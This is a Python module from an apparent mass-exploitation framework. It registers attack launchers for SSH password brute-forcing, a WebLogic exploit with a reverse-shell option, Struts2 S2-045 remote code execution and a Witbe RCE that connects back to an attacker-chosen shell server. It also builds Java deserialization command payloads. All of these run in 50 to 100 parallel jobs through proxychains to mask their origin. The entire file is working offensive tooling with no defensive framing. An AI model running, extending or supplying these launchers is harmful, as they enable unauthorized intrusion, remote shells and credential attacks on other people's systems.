#!/usr/bin/python3

'''
add exploits here, call them in mec.py
'''

import os

from lib.cli import colors, console, core


def ssh_bruteforcer(session):
    '''
    call single thread ssh_bruteforcer
    '''
    password_list = console.input_check(
        "[*] Password list file to use: ", allow_blank=False)
    if not os.path.isfile(password_list):
        console.print_error("[-] Password list not found")
        return None

    # command to exec
    command = console.input_check("[*] Command to exec: ", allow_blank=False)

    # args list
    exploit = 'ssh_bruteforce.py'
    work_path = '/ssh-bruteforce/'
    exec_path = exploit
    custom_args = str(password_list + ' ' + command).split()
    jobs = 100

    print(colors.BLUE +
          '[*] Your exploit will be executed like\n' +
          colors.END,
          'proxychains4 -q -f proxy.conf {} {} -t <target ip>'.format(exec_path,
                                                                      ' '.join(custom_args)))
    # start scanner
    return core.Scanner(work_path, exec_path, custom_args, jobs, session)


def java_payload(ostype, cmd):
    '''
    generate payload
    '''
    if ostype == 'w':
        os.system(
            "java -jar exploits/exserial/exserial.jar \
            CommandExec Win {} > /tmp/win.bin".format(cmd))
    else:
        os.system(
            "java -jar exploits/exserial/exserial.jar \
            CommandExec Linux {} > /tmp/lin.bin".format(cmd))


def weblogic(session):
    '''
    with reverse shell
    '''
    print(colors.BLUE +
          '\n[*] Welcome to Weblogic getshell exploit' +
          colors.END)

    server_port = console.input_check(
        "[?] What's the port of Welogic server? ",
        check_type=int)
    os_type = console.input_check(
        '[?] Windows or Linux? [w/l] ', choices=['w', 'l'])
    if console.input_check('[?] Do you need a reverse shell? [y/n] ',
                           choices=['y', 'n']) == 'y':
        shell_server = console.input_check(
            '[?] What\'s the IP of shell receiver? ',
            allow_blank=False, ip_check=True)
        port = console.input_check(
            '[?] What\'s the port of shell receiver? ',
            check_type=int)
        if os_type.lower() == 'w':
            custom_args = '-l {} -p {} -P {} --silent -T '.format(
                shell_server, port, server_port) +\
                'reverse_shell -os win'
            custom_args = custom_args.split()
        elif os_type.lower() == 'l':
            custom_args = '-l {} -p {} -P {} --silent -T '.format(
                shell_server, port, server_port) +\
                'reverse_shell -os linux'
            custom_args = custom_args.split()
        else:
            console.print_error('[-] Invalid input')
            return None
    else:
        cmd = console.input_check(
            '[?] What command do you want to execute on the target? ',
            allow_blank=False).strip()
        if os_type.lower() == 'w':
            custom_args = '-P {} --silent -T exploit -c {} -os win'.format(
                server_port, cmd).split()
        elif os_type.lower() == 'l':
            custom_args = '-P {} --silent -T exploit -c {} -os linux'.format(
                server_port, cmd).split()
        else:
            return None

    # start scanner
    exploit = 'weblogic.py'
    work_path = '/weblogic/'
    exec_path = exploit
    jobs = 100
    # waitTime = 25  # deprecated
    return core.Scanner(work_path, exec_path, custom_args, jobs, session)


def s2_045(session):
    '''
    struts2 045 rce
    '''
    print(colors.BLUE + '\n[*] Welcome to S2-045' + colors.END)
    port = console.input_check(
        '[?] What\'s the port of your target server? ',
        check_type=int)

    # args list
    exploit = 's2_045_cmd.py'
    work_path = '/structs2/'
    exec_path = exploit
    custom_args = str('-p ' + port).split()
    jobs = 100

    print(colors.BLUE +
          '[*] Your exploit will be executed like\n' +
          colors.END,
          'proxychains4 -q -f proxy.conf {} {} -t <target ip>'.format(exec_path,
                                                                      ' '.join(custom_args)))
    # start scanner
    return core.Scanner(work_path, exec_path, custom_args, jobs, session)


def witbe(session):
    '''
    witbe rce
    '''
    print(colors.BLUE + '\n[*] Welcome to Witbe RCE' + colors.END)

    # shell server config
    rhost = console.input_check('[?] IP of your shell server: ')
    rport = console.input_check('[?] and Port? ', check_type=int)

    # exploit config
    exploit = 'witbe.py'
    work_path = '/witbe/'
    exec_path = exploit
    custom_args = str('-l ' + rhost + ' -p ' + rport).split()
    jobs = 50
    print(colors.BLUE +
          '[*] Your exploit will be executed like\n' +
          colors.END,
          'proxychains4 -q -f proxy.conf {} -t <target ip>'.format(exec_path),
          ' '.join(custom_args))
    # start scanner
    return core.Scanner(work_path, exec_path, custom_args, jobs, session)


EXPLOIT_DICT = {
    # "websphere": websphere,
    # "jboss": jboss,
    # "jenkins": jenkins,
    # "redis": redis,
    "ssh_bruteforcer": ssh_bruteforcer,
    "weblogic": weblogic,
    "s2_045": s2_045,
    "witbe": witbe
}
